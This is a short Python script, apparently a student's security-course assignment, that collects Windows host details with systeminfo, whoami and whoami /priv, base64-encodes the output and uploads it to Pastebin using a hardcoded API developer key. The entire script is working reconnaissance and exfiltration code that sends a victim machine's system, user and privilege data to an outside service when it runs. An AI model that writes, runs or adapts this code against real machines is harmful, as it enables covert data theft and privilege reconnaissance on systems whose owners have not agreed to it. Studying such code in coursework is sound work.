#Nama  : Muhammad Rayhan Noorsandi
#NIM   : 2301890232
#Class : LB07

import os
import requests
import subprocess
import sys
import base64

def upload(data):

    url = 'https://pastebin.com/api/api_post.php'

    api_info={
        'api_dev_key' : 'I4uClrmssY53kUBpJXOtRczTrXUlfvDs',
        'api_paste_code' : data,
        'api_paste_name' : "result",
        'api_option' : 'paste'
    }

    try:
        req = requests.post(url,data=api_info)
        print("Uploaded: ",req.text)
    except:
        print(Exception)

def cmd():
    run = ["systeminfo","whoami","whoami /priv"]
    res=[]

    for x in run:
        tp = subprocess.Popen(args=x,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
        
        str,error=tp.communicate()

        if error !=b'':
            res.append(x)
            res.append(error.decode())
        else:
            res.append(str.decode())
    
    res = "\n".join(res)
    
    upload(base64.b64encode(res.encode()))

def main():
    cmd()
main()





